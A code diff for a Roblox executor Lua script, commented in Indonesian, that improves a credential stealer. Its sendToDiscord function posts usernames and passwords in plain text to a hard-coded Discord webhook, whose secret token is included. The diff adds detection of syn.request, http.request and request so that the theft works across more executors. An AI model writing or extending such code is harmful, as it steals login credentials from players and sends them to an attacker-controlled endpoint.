@@ -1,31 +1,51 @@
+-- Fungsi untuk mendeteksi executor
+local function detectExecutor()
+    if syn and syn.request then
+        return "syn"
+    elseif http and http.request then
+        return "http"
+    elseif request then
+        return "request"
+    else
+        return nil
+    end
+end
+
 -- URL Webhook Discord
 local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"
 
--- Fungsi untuk mengirim data ke Discord
 local function sendToDiscord(username, password)
-    print("Fungsi sendToDiscord dipanggil") -- Debugging
-    if syn and syn.request then
-        print("Executor mendukung syn.request") -- Debugging
-        -- Membuat permintaan HTTP
-        local response = syn.request({
-            Url = webhook_url,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = game:GetService("HttpService"):JSONEncode({
-                content = "Login attempt:\nUsername: " .. username .. "\nPassword: " .. password
-            })
-        })
+    local executor = detectExecutor()
+    if not executor then
+        print("Executor tidak mendukung HTTP requests!")
+        return
+    end
 
-        -- Debugging hasil
-        if response.Success then
-            print("Data berhasil dikirim ke Discord!")
-        else
-            print("Gagal mengirim data ke Discord:", response.StatusCode, response.Body)
-        end
+    local payload = {
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({
+            content = "Login attempt:\nUsername: " .. username .. "\nPassword: " .. password
+        })
+    }
+
+    local response
+    if executor == "syn" then
+        response = syn.request(payload)
+    elseif executor == "http" then
+        response = http.request(payload)
+    elseif executor == "request" then
+        response = request(payload)
+    end
+
+    -- Debugging hasil
+    if response and response.Success then
+        print("Data berhasil dikirim ke Discord!")
     else
-        print("Executor Anda tidak mendukung HTTP requests!")
+        print("Gagal mengirim data ke Discord!")
     end
 end
 
